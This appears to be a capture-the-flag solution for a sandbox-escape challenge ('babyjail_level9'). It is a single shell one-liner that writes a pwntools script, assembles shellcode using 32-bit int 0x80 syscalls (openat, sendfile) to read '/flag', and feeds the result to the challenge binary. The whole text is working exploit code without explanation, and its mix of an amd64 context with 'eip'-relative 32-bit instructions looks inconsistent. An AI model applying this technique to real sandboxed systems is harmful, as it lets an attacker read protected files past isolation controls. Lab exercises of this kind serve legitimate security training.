echo 'import pwn
pwn.context.arch = "amd64"
assembly = pwn.asm("""
    lea ecx, [eip+flag]
    mov eax, 295
    mov ebx, 3
    mov edx, 0
    mov esi, 0
    int 0x80
    mov ebx, 1
    mov ecx, eax
    mov edx, 0
    mov esi, 1000
    mov eax, 187
    int 0x80
flag:
    .string "/flag"
""")
with open("9raw", "wb") as f:
    f.write(assembly)' > sand.py && /bin/python3 sand.py && /challenge/babyjail_level9 < 9raw
